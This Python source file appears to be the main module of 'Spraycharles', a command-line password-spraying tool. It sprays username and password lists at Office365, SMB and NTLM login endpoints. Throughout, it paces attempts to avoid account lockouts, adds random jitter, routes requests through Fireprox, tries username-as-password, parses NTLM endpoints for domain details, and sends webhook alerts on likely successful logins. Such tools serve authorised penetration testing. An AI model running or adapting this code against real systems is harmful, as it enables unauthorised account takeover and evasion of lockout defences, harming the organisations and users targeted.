#!/usr/bin/env python3

import csv
import datetime
import json
import logging
import os
import pathlib
import random
import sys
import time
import warnings
from pathlib import Path
from time import sleep

import click
import click_config_file
import requests
from rich import print
from rich.console import Console
from rich.padding import Padding
from rich.progress import Progress
from rich.prompt import Confirm
from rich.table import Table
from rich.theme import Theme

from .analyze import Analyzer
from .analyze import main as analyzer
from .targets import *
from .utils.make_list import main as make_list
from .utils.ntlm_challenger import main as ntlm_challenger

VERSION = "1.0.7"

# Defining theme
custom_theme = Theme(
    {
        "info": "blue",
        "good": "bold bright_green",
        "warning": "bold yellow",
        "danger": "bold bright_red",
    }
)

console = Console(theme=custom_theme)


class Spraycharles:
    def __init__(
        self,
        passwords,
        users,
        host,
        module,
        path,
        output,
        attempts,
        interval,
        equal,
        timeout,
        port,
        fireprox,
        domain,
        analyze,
        jitter,
        jitter_min,
        notify,
        webhook,
        pause,
    ):
        """
        Validate args and initalize class attributes
        """

        # if any other module than Office365 is specified, make sure hostname was provided
        if module.lower() != "office365" and not host:
            console.print(
                "[!] Hostname (-H) of target (mail.targetdomain.com) is required for all modules execept Office365",
                style="danger",
            )
            exit()

        elif module.lower() == "office365" and not host:
            host = "Office365"  # set host to Office365 for the logfile name
        elif module.lower() == "smb" and (timeout != 5 or fireprox or port != 443):
            console.print(
                "[!] Fireprox (-f), port (-P) and timeout (-t) are incompatible when spraying over SMB",
                style="warning",
            )

        # get usernames from file
        try:
            with open(users, "r") as f:
                user_list = f.read().splitlines()
        except Exception:
            console.print(
                f"[!] Error reading usernames from file: {users}", style="danger"
            )
            exit()

        # get passwords from file, otherwise treat arg as a single password to spray
        try:
            with open(passwords, "r") as f:
                password_list = f.read().splitlines()
        except Exception:
            password_list = [passwords]

        # check that interval and attempt args are supplied together
        if interval and not attempts:
            console.print(
                "[!] Number of login attempts per interval (-a) required with -i",
                style="danger",
            )
            exit()
        elif not interval and attempts:
            console.print(
                "[!] Minutes per interval (-i) required with -a", style="danger"
            )
            exit()
        elif not interval and not attempts and len(password_list) > 1:
            console.print(
                "[*] You have not provided spray attempts/interval. This may lead to account lockouts!",
                style="warning",
            )
            print()

            Confirm.ask(
                "[yellow]Press enter to continue anyways",
                default=True,
                show_choices=False,
                show_default=False,
            )

        # Check that jitter flags aren't supplied independently
        if jitter_min and not jitter:
            console.print(
                "--jitter-min flag must be set with --jitter flag", style="danger"
            )
            exit()

        elif jitter and not jitter_min:
            console.print(
                "[!] --jitter flag must be set with --jitter-min flag", style="danger"
            )
            exit()

        if jitter and jitter_min and jitter_min >= jitter:
            console.print(
                "[!] --jitter flag must be greater than --jitter-min flag",
                style="danger",
            )
            exit()

        # Making sure user set path variable for NTLM authentication module
        if module.lower() == "ntlm" and path is None:
            console.print(
                "[!] Must set --path to use the NTLM authentication module",
                style="danger",
            )
            exit()

        if notify and webhook is None:
            console.print(
                "[!] Must specify a Webhook URL when the notify flag is used.",
                style="danger",
            )
            exit()

        # Create spraycharles directories if they don't exist
        user_home = str(Path.home())
        if not os.path.exists(f"{user_home}/.spraycharles"):
            os.mkdir(f"{user_home}/.spraycharles")
            os.mkdir(f"{user_home}/.spraycharles/logs")
            os.mkdir(f"{user_home}/.spraycharles/out")

        # Building output files
        current = datetime.datetime.now()
        timestamp = current.strftime("%Y%m%d-%H%M%S")
        if output == "output.csv":
            output = f"{user_home}/.spraycharles/out/{host}.{timestamp}.csv"

        self.passwords = password_list
        self.password_file = passwords
        self.usernames = user_list
        self.user_file = users
        self.host = host
        self.module = module
        self.path = path
        self.output = output
        self.attempts = attempts
        self.interval = interval
        self.equal = equal
        self.timeout = timeout
        self.port = port
        self.fireprox = fireprox
        self.domain = domain
        self.analyze = analyze
        self.jitter = jitter
        self.jitter_min = jitter_min
        self.notify = notify
        self.webhook = webhook
        self.pause = pause
        self.total_hits = 0
        self.login_attempts = 0
        self.target = None
        self.log_name = None

    def initialize_module(self):
        """
        Instantiate the specified spray module
        """
        try:
            # Passing in path for NTLM over HTTP module
            if self.module.title().lower() == "ntlm":
                self.module = self.module.title()
                mod_name = getattr(sys.modules[__name__], self.module)
                class_name = getattr(mod_name, self.module)
                self.target = class_name(
                    self.host, self.port, self.timeout, self.path, self.fireprox
                )
            else:
                # Else, we just pass the default arguments
                self.module = self.module.title()
                mod_name = getattr(sys.modules[__name__], self.module)
                class_name = getattr(mod_name, self.module)
                self.target = class_name(
                    self.host, self.port, self.timeout, self.fireprox
                )
        except AttributeError:
            console.print(
                f"[!] Error loading {self.module} module. {self.module} is spelled incorrectly or does not exist",
                style="danger",
            )
            exit()

        # Create the logfile
        user_home = str(Path.home())
        current = datetime.datetime.now()
        timestamp = int(round(current.timestamp()))

        self.log_name = f"{user_home}/.spraycharles/logs/{self.host}.{timestamp}.log"
        logging.basicConfig(
            filename=self.log_name,
            level=logging.INFO,
            format="%(asctime)s - %(levelname)s - %(message)s",
        )

    def pre_spray_info(self):
        """
        Display spray config table
        """
        spray_info = Table(
            show_header=False,
            show_footer=False,
            min_width=61,
            title=f"Module: {self.module.upper()}",
            title_justify="left",
            title_style="bold reverse",
        )

        spray_info.add_row("Target", f"{self.target.url}")

        if self.domain:
            spray_info.add_row("Domain", f"{self.domain}")

        if self.attempts:
            spray_info.add_row("Interval", f"{self.interval} minutes")
            spray_info.add_row("Attempts", f"{self.attempts} per interval")

        if self.jitter:
            spray_info.add_row("Jitter", f"{self.jitter_min}-{self.jitter} seconds")

        if self.notify:
            spray_info.add_row("Notify", f"True ({self.notify})")

        log_name = pathlib.PurePath(self.log_name)
        out_name = pathlib.PurePath(self.output)
        spray_info.add_row("Logfile", f"{log_name.name}")
        spray_info.add_row("Results", f"{out_name.name}")

        console.print(spray_info)

        print()
        Confirm.ask(
            "[blue]Press enter to begin",
            default=True,
            show_choices=False,
            show_default=False,
        )
        print()

        if self.module == "Smb":
            console.print(
                f"[*] Initiaing SMB connection to {self.host} ...", style="warning"
            )
            if self.target.get_conn():
                console.print(
                    f'[+] Connected to {self.host} over {"SMBv1" if self.target.smbv1 else "SMBv3"}',
                    style="good",
                )

                console.print(f"\t[>] Hostname: {self.target.hostname} ", style="info")
                console.print(f"\t[>] Domain: {self.target.domain} ", style="info")
                console.print(f"\t[>] OS: {self.target.os} ", style="info")
                print()

            else:
                console.print(
                    f"[!] Failed to connect to {self.host} over SMB", style="danger"
                )
                exit()

        self.target.print_headers(self.output)

    def _check_sleep(self):
        """
        If running on interval, handle analyzing and sleep interval
        """
        if self.login_attempts == self.attempts:
            if self.analyze:
                analyzer = Analyzer(
                    self.output, self.notify, self.webhook, self.host, self.total_hits
                )
                new_hit_total = analyzer.analyze()

                # Pausing if specified by user before continuing with spray
                if new_hit_total > self.total_hits and self.pause:
                    print()
                    console.print(
                        f"[+] Successful login potentially identified. Pausing...",
                        style="good",
                    )
                    print()
                    Confirm.ask(
                        "[blue]Press enter to continue",
                        default=True,
                        show_choices=False,
                        show_default=False,
                    )
                    print()
            else:
                new_hit_total = (
                    0  # just set to zero since results aren't being analyzed mid-spray
                )
                print()

            console.print(
                f'[yellow][*] Sleeping until {(datetime.datetime.now() + datetime.timedelta(minutes=self.interval)).strftime("%m-%d %H:%M:%S")}[/yellow]'
            )
            time.sleep(self.interval * 60)
            print()

            # reset counter and set hit total
            self.login_attempts = 0
            self.total_hits = new_hit_total

    def _check_file_contents(self, file_path, current_list):
        """
        Check if password or username list changed during execution
        """

        new_list = []
        try:
            with open(file_path, "r") as f:
                new_list = f.read().splitlines()
        except:
            # file either no longer exists, or -p flag was given a password and not a file
            pass

        additions = list(set(new_list) - set(current_list))
        return additions

    def _print_attempt(self, username, password, response):
        """
        Prints the results of a single login attempt
        """

        if response == "timeout":
            code = "TIMEOUT"
            length = "TIMEOUT"
        else:
            code = response.status_code
            length = str(len(response.content))
        print("%-27s %-17s %13s %15s" % (username, password, code, length))
        output = open(self.output, "a")
        output.write("%s,%s,%s,%s\n" % (username, password, code, length))
        output.close()

    def _login(self, username, password):
        """
        Perform login attempt
        """

        try:
            response = self.target.login(username, password)
            self.target.print_response(response, self.output)
        except requests.ConnectTimeout as e:
            self.target.print_response(response, self.output, timeout=True)
        except (requests.ConnectionError, requests.ReadTimeout) as e:
            console.print(
                "\n[!] Connection error - sleeping for 5 seconds", style="danger"
            )
            sleep(5)
            self._login(username, password)

    def spray(self):
        """
        Begin the password spray
        """
        # spray once with password = username if flag present
        if self.equal:
            with Progress(transient=True) as progress:
                task = progress.add_task(
                    f"[yellow]Equal Set", total=len(self.usernames)
                )
                for username in self.usernames:
                    password = username.split("@")[0]
                    if self.jitter is not None:
                        if self.jitter_min is None:
                            self.jitter_min = 0
                        time.sleep(random.randint(self.jitter_min, self.jitter))
                    self._login(username, password)
                    progress.update(task, advance=1)

                    # log the login attempt
                    logging.info(f"Login attempted as {username}")

            self.login_attempts += 1

        # spray using password file
        for password in self.passwords:
            # trigger sleep if attempts limit hit
            self._check_sleep()

            # check if user/pass files have been updated and add new entries to current lists
            # this will let users add (but not remove) users/passwords into the spray as it runs
            new_users = self._check_file_contents(self.user_file, self.usernames)
            new_passwords = self._check_file_contents(
                self.password_file, self.passwords
            )

            if len(new_users) > 0:
                console.print(
                    f"[>] Adding {len(new_users)} new users into the spray!",
                    style="info",
                )
                self.usernames.extend(new_users)

            if len(new_passwords) > 0:
                console.print(
                    f"[>] Adding {len(new_passwords)} new passwords to the end of the spray!",
                    style="info",
                )
                self.passwords.extend(new_passwords)

            # print line separator
            if len(new_passwords) > 0 or len(new_users) > 0:
                print()

            with Progress(transient=True) as progress:
                task = progress.add_task(
                    f"[green]Spraying: {password}", total=len(self.usernames)
                )
                while not progress.finished:
                    for username in self.usernames:
                        if self.domain:
                            username = f"{self.domain}\\{username}"
                        if self.jitter is not None:
                            if self.jitter_min is None:
                                self.jitter_min = 0
                            time.sleep(random.randint(self.jitter_min, self.jitter))
                        self._login(username, password)
                        progress.update(task, advance=1)

                        # log the login attempt
                        logging.info(f"Login attempted as {username}")

            self.login_attempts += 1

        # analyze the results to point out possible hits
        analyzer = Analyzer(
            self.output, self.notify, self.webhook, self.host, self.total_hits
        )
        analyzer.analyze()

    def ascii(self):
        print(
            f"""

[yellow] ___  ___  ___  ___  _ _ [blue] ___  _ _  ___  ___  _    ___  ___
[yellow]/ __>| . \| . \| . || | |[blue]|  _>| | || . || . \| |  | __>/ __>
[yellow]\__ \|  _/|   /|   |\   /[blue]| <__|   ||   ||   /| |_ | _> \__ \\
[yellow]<___/|_|  |_\_\|_|_| |_| [blue]`___/|_|_||_|_||_\_\|___||___><___/

[yellow]                        v[blue]{VERSION}
"""
        )


# Defining context settings for click CLI
CONTEXT_SETTINGS = dict(help_option_names=["-h", "--help", "help"])


# Defining the cli group for all submocomands
# The cli() function allows users to use the spray module by default
@click.group()
@click.pass_context
def cli(ctx):
    if ctx.invoked_subcommand is None:
        spray()


@cli.command(no_args_is_help=False, context_settings=CONTEXT_SETTINGS)
def list():
    """
    List all the available spraying modules
    """

    module_table = Table(
        show_header=True,
        show_footer=False,
        min_width=61,
        title="Spraying Modules",
        title_justify="left",
        title_style="bold reverse",
    )
    module_table.add_column("Module", style="bold")
    module_table.add_column("Description")
    dir_path = os.path.dirname(os.path.realpath(__file__))
    mod_list = os.listdir(dir_path + "/targets/")
    for module in mod_list:
        if module.endswith(".py") and module != "__init__.py":
            module = module.replace(".py", "")
            mod_name = getattr(sys.modules[__name__], module)
            class_name = getattr(mod_name, module)
            doc = class_name.__doc__
            module_table.add_row(f"[blue]{module}[/blue]", f"[yellow]{doc}[/yellow]")

    console.print(Padding(module_table, (1, 1)))


@cli.command(no_args_is_help=True, context_settings=CONTEXT_SETTINGS)
@click.option(
    "-p",
    "--passwords",
    "passwords",
    required=True,
    help="Filepath of the passwords list or a single password to spray.",
)
@click.option(
    "-u",
    "--usernames",
    "usernames",
    required=True,
    help="Filepath of the usernames list.",
)
@click.option(
    "-H",
    "--host",
    required=False,
    type=str,
    help="Host to password spray (ip or hostname). Can by anything when using Office365 module - only used for logfile name.",
)
@click.option(
    "-m", "--module", required=True, help="Module corresponding to target host."
)
@click.option(
    "--path", required=False, help="NTLM authentication endpoint. Ex: rpc or ews"
)
@click.option(
    "-o",
    "--output",
    "output",
    required=False,
    help="Name and path of output csv where attempts will be logged.",
    default="output.csv",
)
@click.option(
    "-a",
    "--attempts",
    required=False,
    type=int,
    help="Number of logins submissions per interval (for each user).",
)
@click.option(
    "-i",
    "--interval",
    required=False,
    type=int,
    help="Minutes inbetween login intervals.",
)
@click.option(
    "-e",
    "--equal",
    required=False,
    type=int,
    is_flag=True,
    help="Does 1 spray for each user where password = username.",
)
@click.option(
    "-t",
    "--timeout",
    required=False,
    type=int,
    help="Web request timeout threshold. Default is 5 seconds.",
    default=5,
)
@click.option(
    "-P",
    "--port",
    required=False,
    type=int,
    help="Port to connect to on the specified host. Default is 443.",
    default=443,
)
@click.option(
    "-f",
    "--fireprox",
    required=False,
    type=str,
    help="The url of the fireprox interface, if you are using fireprox.",
)
@click.option(
    "-d",
    "--domain",
    required=False,
    type=str,
    help="HTTP: Prepend DOMAIN\\ to usernames. SMB: Supply domain for smb connection.",
)
@click.option(
    "--pause",
    "pause",
    required=False,
    is_flag=True,
    default=False,
    type=str,
    help="Pause the spray following a potentially successful login",
)
@click.option(
    "--analyze",
    "analyze",
    default=False,
    is_flag=True,
    required=False,
    type=str,
    help="Run the results analyzer after each spray interval. False positives are more likely",
)
@click.option(
    "-j",
    "--jitter",
    required=False,
    type=int,
    help="Jitter time between requests in seconds.",
)
@click.option(
    "-jm",
    "--jitter-min",
    required=False,
    type=int,
    help="Minimum time between requests in seconds.",
)
@click.option(
    "-n",
    "--notify",
    required=False,
    type=click.Choice(["teams", "slack", "discord"]),
    help="Enable notifications for Slack, MS Teams or Discord.",
)
@click.option(
    "-w",
    "--webhook",
    required=False,
    type=str,
    help="Webhook used for specified notification module",
)
# Allows user to specify configuration file with --config
@click_config_file.configuration_option()
def spray(
    passwords,
    usernames,
    host,
    module,
    path,
    output,
    attempts,
    interval,
    equal,
    timeout,
    port,
    fireprox,
    domain,
    analyze,
    jitter,
    jitter_min,
    notify,
    webhook,
    pause,
):
    """Low and slow password spraying tool."""

    # Dealing with SSL Warnings
    try:
        import requests.packages.urllib3

        requests.packages.urllib3.disable_warnings()
    except Exception:
        pass

    spraycharles = Spraycharles(
        passwords,
        usernames,
        host,
        module,
        path,
        output,
        attempts,
        interval,
        equal,
        timeout,
        port,
        fireprox,
        domain,
        analyze,
        jitter,
        jitter_min,
        notify,
        webhook,
        pause,
    )

    spraycharles.initialize_module()
    spraycharles.ascii()
    spraycharles.pre_spray_info()
    spraycharles.spray()


# Defining the parse submodule. References ntlm_challanger.py script in utils
@cli.command(no_args_is_help=True, context_settings=CONTEXT_SETTINGS)
@click.argument("url", required=True)
@click.option("--smbv1", is_flag=True, default=False, help="Use SMBv1 protocol")
def parse(url, smbv1):
    """
    Parse NTLM over HTTP and SMB endpoints to collect domain information.
    """
    ntlm_challenger(url, smbv1)


# Defining the gen submodule. References make_list.py script in utils
@cli.command(no_args_is_help=True, context_settings=CONTEXT_SETTINGS)
@click.argument("infile", required=True, type=click.Path(exists=True))
@click.argument("outfile", required=True)
def gen(infile, outfile):
    """
    Generate custom password lists from JSON file.
    """
    make_list(infile, outfile)


# Defining the analyzer submodule. References analyze.py script.
@cli.command(no_args_is_help=True, context_settings=CONTEXT_SETTINGS)
@click.argument("infile", required=True, type=click.Path(exists=True))
@click.option(
    "-n",
    "--notify",
    required=False,
    default=None,
    type=click.Choice(["teams", "slack", "discord"]),
    help="Enable notifications for Slack, MS Teams or Discord.",
)
@click.option(
    "-w",
    "--webhook",
    required=False,
    type=str,
    default=False,
    help="Webhook used for specified notification module.",
)
@click.option(
    "-H",
    "--host",
    required=False,
    type=str,
    default=False,
    help="Target host associated with CSV file.",
)
def analyze(infile, notify, webhook, host):
    """Analyze existing csv files."""
    analyzer(infile, notify, webhook, host)


# stock boilerplate
if __name__ == "__main__":
    cli()
